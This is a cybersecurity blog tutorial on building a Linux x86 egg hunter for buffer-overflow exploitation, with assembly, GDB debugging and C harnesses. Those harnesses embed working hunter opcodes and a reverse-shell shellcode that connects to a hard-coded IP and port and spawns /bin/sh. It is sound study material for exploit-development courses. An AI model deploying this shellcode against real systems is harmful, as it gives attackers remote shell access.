<!DOCTYPE html><html lang="en" mode="light" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Egg Hunter | Yet another cyber security blog</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Egg Hunter" /><meta name="author" content="Stipe Marinovic" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://smarinovic.github.io/posts/EggHunter/" /><meta property="og:url" content="https://smarinovic.github.io/posts/EggHunter/" /><meta property="og:site_name" content="Yet another cyber security blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-09T16:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Egg Hunter" /><meta name="twitter:site" content="@stipemarinovic" /><meta name="twitter:creator" content="@Stipe Marinovic" /> <script type="application/ld+json"> {"@type":"BlogPosting","url":"https://smarinovic.github.io/posts/EggHunter/","headline":"Egg Hunter","dateModified":"2020-06-09T16:00:00+02:00","datePublished":"2020-06-09T16:00:00+02:00","author":{"@type":"Person","name":"Stipe Marinovic"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://smarinovic.github.io/posts/EggHunter/"},"description":"Introduction","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/commons/profil.jpg" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">Yet another cyber security blog</a></div><div id="site-subtitle" class="font-italic">HTB writeups, OSCP, OSCE study resources</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/smarinovic" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/stipemarinovic" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['stipe.marinovic','protonmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Egg Hunter</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Egg Hunter</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 9, 2020, 4:00 PM +0200"> Jun 9, 2020 <i class="unloaded">2020-06-09T16:00:00+02:00</i> </span> by <span class="author"> Stipe Marinovic </span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><p>Egg Hunter is super useful and simple piece of code used to search for an defined series of bytes called “egg” in a memory. Egg as such is just a 4 bytes string, usually: “w00t” (but it can be anything else unique) which is added twice as prefix to a shellcode and thus marks beginning of a shell code.<br /> Egg Hunter is used in situation when buffer overflow vulnerability provides limited space, not large enough for placing shell code, but still shell code ends up somehow, somewhere in a memory.<br /> For example, HTTP header can be vulnerable to buffer overflow but useful buffer is not large enough to hold shell code so instead shell code can can be delivered as payload within POST parameters of the same request etc. <br /> Instead of direct execution of shellcode at first Egg Hunter is executed which searches for a egg in a memory and once it founds egg (two instances of egg: w00tw00t) it passes execution to a shellcode located just after the egg.<br /> Egg is appended twice as prefix to shell code in order to prevent Egg Hunter to find itself, meaning that egg is “w00t” but Egg Hunter is looking for two occurrences of egg (w00t) one after another (w00tw00t).</p><h2 id="prototype">Prototype</h2><p>We could write Egg Hunter in pseudo code as follows:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>egg = "w00t"                              # define egg
x = 0                                     # starting memory location 

While(True):                              # loop - which is running until 2 eggs are found
  if read(4 bytes at x) == egg:           # read 4 bytes and compare to egg (w00t)
    if read(4 bytes at x+4) == egg:       # if first 4 bytes are eaqual to egg, read next 4 bytes
      execute x+8                         # if another occurance of egg is found, pass execution to x+8 (shell code location)
  else:
    x = x+1                               # if egg isn't found, increase memory location +1 and try again
</pre></table></code></div></div><h2 id="egg-hunter---first-attempt">Egg Hunter - first attempt</h2><p>Let’s write basic Egg Hunter in assembly code based on prototype and see what will happen. Once Egg Hunter is compiled and liked, we can use Egg Hunter opcode with sekeleton code from previous blog posts. In order for Egg Hunter to find and execute shell code (reverse shell code from previous blog post was used) we need to add two instances of egg <code class="language-plaintext highlighter-rouge">\x77\x30\x30\x74</code> at the beginning of shell code.</p><ul><li>Assemlby code is following:</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>global _start

_start:

XOR EDX, EDX                    ; clear EDX

NEXT_ADDRESS:                   ; label used for looping
  INC EDX                       ; increase EDX by 1

  CMP DWORD [EDX], 0x74303077   ; Compare 4 bytes with w00t
  JNZ SHORT NEXT_ADDRESS        ; if w00t not found, jump to NEXT_ADDRESS

  CMP dword [EDX+4], 0x74303077 ; if w00t found, compare next 4 bytes with w00t 
  JNZ SHORT NEXT_ADDRESS        ; if second w00t not found, jump to NEXT_ADDRESS

  ADD EDX, 0x8                  ; if two eggs are found, increase EDX + 8         
  JMP EDX                       ; jump to EDX + 8 address where shell code would be located

</pre></table></code></div></div><p>Assembly code can be compiled and linked with following commands:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nasm -f elf32 -o egghunter1.o egghunter1.nasm
ld -z execstack -o egghunter1 egghunter1.o
</pre></table></code></div></div><p>Following series of piped commands can be used to extract opcodes:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>objdump -d egghunter1 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
</pre></table></code></div></div><ul><li>Skeleton code with Egg Hunter and reverse shell is following:</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>#include &lt;stdio.h&gt;

unsigned char egghunter[] = "\x31\xd2\x42\x81\x3a\x77\x30\x30\x74\x75\xf7\x81\x7a\x04\x77\x30\x30\x75\xee\x83\xc2\x08\xff\xe2";
unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
// 1st egg ------------------^^^^^^^^^^^^^^^^^
// 2nd egg -----------------------------------^^^^^^^^^^^^^^^

int main()
{
        int (*ret)() = (int(*)())egghunter;
        printf("Size of egghunter: %d bytes.\n", sizeof(egghunter)); 
        ret();
}
</pre></table></code></div></div><p>When compiled and run we get an segmentation fault at the very beginning of execution as shown on following screenshot and GDB output:</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00015.png" alt="segmentation fault" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x404040 --&gt; 0x8142d231 
EBX: 0x404000 --&gt; 0x3efc 
ECX: 0x0 
EDX: 0x1 
ESI: 0xb7fb8000 --&gt; 0x1dfd6c 
EDI: 0xb7fb8000 --&gt; 0x1dfd6c 
EBP: 0xbffff2b8 --&gt; 0x0 
ESP: 0xbffff29c --&gt; 0x4011d9 (&lt;main+64&gt;:        mov    eax,0x0)
EIP: 0x404043 --&gt; 0x30773a81
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40403e:    add    BYTE PTR [eax],al
   0x404040 &lt;egghunter&gt;:        xor    edx,edx
   0x404042 &lt;egghunter+2&gt;:      inc    edx
=&gt; 0x404043 &lt;egghunter+3&gt;:      cmp    DWORD PTR [edx],0x74303077
   0x404049 &lt;egghunter+9&gt;:      jne    0x404042 &lt;egghunter+2&gt;
   0x40404b &lt;egghunter+11&gt;:     cmp    DWORD PTR [edx+0x4],0x75303077
   0x404052 &lt;egghunter+18&gt;:     out    dx,al
   0x404053 &lt;egghunter+19&gt;:     add    edx,0x8
[------------------------------------stack-------------------------------------]
0000| 0xbffff29c --&gt; 0x4011d9 (&lt;main+64&gt;:       mov    eax,0x0)
0004| 0xbffff2a0 --&gt; 0x1 
0008| 0xbffff2a4 --&gt; 0xbffff364 --&gt; 0xbffff4e5 ("/root/repository/slae-exam/assignment03/egghunter1_exe")
0012| 0xbffff2a8 --&gt; 0xbffff36c --&gt; 0xbffff51c ("SHELL=/bin/bash")
0016| 0xbffff2ac --&gt; 0x404040 --&gt; 0x8142d231 
0020| 0xbffff2b0 --&gt; 0xbffff2d0 --&gt; 0x1 
0024| 0xbffff2b4 --&gt; 0x0 
0028| 0xbffff2b8 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00404043 in egghunter ()
</pre></table></code></div></div><p>The reason we got segmentation fault is because our program is trying to access unallocated memory.<br /> We can verify this with following gdb command <code class="language-plaintext highlighter-rouge">x/1b 0x1</code> used to display one byte at given location 0x1:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>gdb-peda$ x/1b 0x1
0x1:    Cannot access memory at address 0x1
gdb-peda$ 
</pre></table></code></div></div><p>To mitigate this issue, there are few possible solutions. Solution we will implement is based on ACCESS syscall.</p><h2 id="the-access-syscall">The access syscall</h2><p>From the <code class="language-plaintext highlighter-rouge">man 2 access</code> pages we can see that access syscall takes two arguments and checks if calling process can access file pathname. At first it seams non usefull to us, but the thing is, access syscall can also accept memory address instead of file pathname and as such can verify if user can access memory location.<br /> Based on the return value (stored in EAX register), we can conclude whether program can access memory location without causing segmentation fault.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>int access(const char *pathname, int mode);
</pre></table></code></div></div><blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced. access() and faccessat() may fail if: EFAULT pathname points outside your accessible address space.</p></blockquote><p>So to successfully use access, we need to monitor return value stored in EAX. If EAX is equal to -14 which is EFAULT then tested address cannot be accessible.</p><p>EFAULT is defined in <code class="language-plaintext highlighter-rouge">/usr/include/libr/sflib/common/sftypes.h</code> file and F_OK is defined in <code class="language-plaintext highlighter-rouge">/usr/include/unistd.h</code> file. that has code 14, or 0xf2 in negative form.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>#define EFAULT          14      /* Bad address */
</pre></table></code></div></div><h2 id="egg-hunter---second-attempt">Egg Hunter - second attempt</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>global _start

section .text
_start:

MOV EDI, 0x74303077 

XOR ECX, ECX                  ; clear ECX as ECX is used as second argument to access syscall
XOR EDX, EDX                  ; clear EDX as EDX will be used to store current address, starting with 0

NEXT_ADDRESS:                 ; label used for looping
  INC EDX                     ; increase EDX by 1 (next address)

XOR EAX, EAX                  ; clear EAX as EAX is used for access syscall number (0x21)
MOV AL, 0x21                  ; move access syscall number in EAX
LEA EBX, [EDX]                ; copy EDX address to EBX as first argument to access syscall
INT 0x80                      ; interrupt (syscall 0x21)
CMP AL, 0xF2                  ; compare access syscall result in EAX with 0xF2 which represent EFAULT
JZ SHORT NEXT_ADDRESS         ; if address is not accessible then jump to NEXT_ADDRESS         

CMP [EDX], EDI                ; if address is accessible then compare 4 bytes with w00t
JNZ SHORT NEXT_ADDRESS        ; if w00t is not found, jump to NEXT_ADDRESS

CMP [EDX+4], EDI              ; if w00t is found, compare next 4 bytes with w00t 
JNZ SHORT NEXT_ADDRESS        ; if second w00t is not found then jump to NEXT_ADDRESS

ADD EDX, 0x8                  ; if two eggs (w00tw00t) are found, increase ECX + 8         
JMP EDX                       ; jump to ECX + 8 address where shell code would be located
</pre></table></code></div></div><p>When we compile it, extract opcode and use opcode within following skeleton C code the Egg Hunter is working but unfortunately not every time. In some cases Egg Hunter crashes.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>#include &lt;stdio.h&gt;

unsigned char egghunter[]= "\xbf\x77\x30\x30\x74\x31\xc9\x31\xd2\x42\x31\xc0\xb0\x21\x8d\x1a\xcd\x80\x3c\xf2\x74\xf3\x39\x3a\x75\xef\x39\x7a\x04\x75\xea\x83\xc2\x08\xff\xe2";
unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
        int (*ret)() = (int(*)())egghunter;
        printf("Size of egghunter: %d bytes.\n", sizeof(egghunter)); 
        ret();
}
</pre></table></code></div></div><p>By using GDB it can be concluded that checking access to only address stored in EDX is not always enough as current address in EDX can be accessible to Egg Hunter but EDX+8 address may not be accessible.<br /> To mitigate this issue we can verify if address from EDX is accessible and if address EDX+8 is also accessible.<br /> Next attempt…</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>global _start

section .text
_start:

MOV EDI, 0x74303077 

XOR ECX, ECX                  ; clear ECX - ECX is used as second argument to access syscall (0)
XOR EDX, EDX                  ; clear EDX - EDX will be used to store current address, starting with 0

NEXT_ADDRESS:                 ; label used for looping
  INC EDX                     ; increase EDX by 1

XOR EAX, EAX                  ; EAX is used for access syscall number (0x21)
MOV AL, 0x21                  ; move access syscall number in EAX
LEA EBX, [EDX]                ; move EDX address to EBX as first argument to access syscall
INT 0x80                      ; interrupt (syscall 0x21)
CMP AL, 0xF2                  ; compare access syscall result in EAX with 0xF2 which represent EFAULT
JZ SHORT NEXT_ADDRESS         ; if address not accessible jump to NEXT_ADDRESS         

XOR EAX, EAX                  ; EAX is used for access syscall number
MOV AL, 0x21                  ; access syscall number
LEA EBX, [EDX+8]              ; move EDX+8 address to EBX as first argument to access syscall
INT 0x80                      ; interrupt (syscall 0x21)
CMP AL, 0xF2                  ; check for EFAULT
JZ SHORT NEXT_ADDRESS         ; if not accessible jump to NEXT_ADDRESS         
              
CMP [EDX], EDI                ; if accessible then Compare 4 bytes with w00t
JNZ SHORT NEXT_ADDRESS        ; if w00t not found, jump to NEXT_ADDRESS

CMP [EDX+4], EDI              ; if w00t found, compare next 4 bytes with w00t 
JNZ SHORT NEXT_ADDRESS        ; if second w00t not found, jump to NEXT_ADDRESS

ADD EDX, 0x8                  ; if two eggs are found, increase ECX + 8         
JMP EDX                       ; jump to ECX + 8 address where shell code would be located
</pre></table></code></div></div><p>Now everyting works fine, shell code is found by Egg Hunter and (reverse) shell code is executed.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00016.png" alt="egghunter2 works" /></p><p>Finding an egg with this Egg Hunter takes time and it has impact on performance which can be seen on the right part of the screenshot - CPU utilization (98.3%).</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00020.png" alt="cpu utilization" /></p><p>According to resources listed in last chapter, Linux maps user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on. If one address from the page is not accessible, all other addresses form the same page are also not accessible. So in order to speed up egghunter we could test if any address from page is accessible and if it is not we can skip to another page which saves us 4095 access syscalls per page.</p><h2 id="egg-hunter---third-and-final-attempt">Egg Hunter - third and final attempt</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>global _start

section .text
_start:

MOV EDI, 0x74303077           ; place egg in EDX
XOR ECX, ECX                  ; clear ECX as ECX will be used as second argument to syscall
XOR EDX, EDX                  ; clear EDX as EDX will be used as to hold current address

NEXT_PAGE:
  OR DX, 0xFFF                ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

NEXT_ADDRESS:                 ; label used for looping
  INC EDX                     ; increase EDX by 1

XOR EAX, EAX                  ; EAX is used for access syscall number
MOV AL, 0x21                  ; access syscall number 0x21
LEA EBX, [EDX+8]              ; check if EDX+8 is accessible
INT 0x80                      ; interrupt (syscall 0x21)

CMP AL, 0xF2                  ; check for EFAULT
JZ NEXT_PAGE                  ; if not accessible jump to NEXT_PAGE         

CMP [EDX], EDI                ; if address is accessible then compare 4 bytes with egg stored in EDI
JNZ NEXT_ADDRESS              ; if egg is not found, jump to NEXT_ADDRESS

CMP [EDX+4], EDI              ; compare next 4 bytes with egg 
JNZ NEXT_ADDRESS              ; if second egg is not found, jump to NEXT_ADDRESS

ADD EDX, 0x8                  ; if two eggs are found, increase EDX + 8 (to skip two eggs)
JMP EDX                       ; jump to EDX + 8 address where shell code would be located

</pre></table></code></div></div><p>opcode: <code class="language-plaintext highlighter-rouge">"\xbf\x77\x30\x30\x74\x31\xc9\x31\xd2\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x3a\x75\xee\x39\x7a\x04\x75\xe9\x83\xc2\x08\xff\xe2"</code></p><p>skeleton code:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>#include &lt;stdio.h&gt;

unsigned char egghunter[] = "\xbf\x77\x30\x30\x74\x31\xc9\x31\xd2\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x3a\x75\xee\x39\x7a\x04\x75\xe9\x83\xc2\x08\xff\xe2";
unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
        int (*ret)() = (int(*)())egghunter;
        printf("Size of egghunter: %d bytes.\n", sizeof(egghunter)); 
        ret();
}
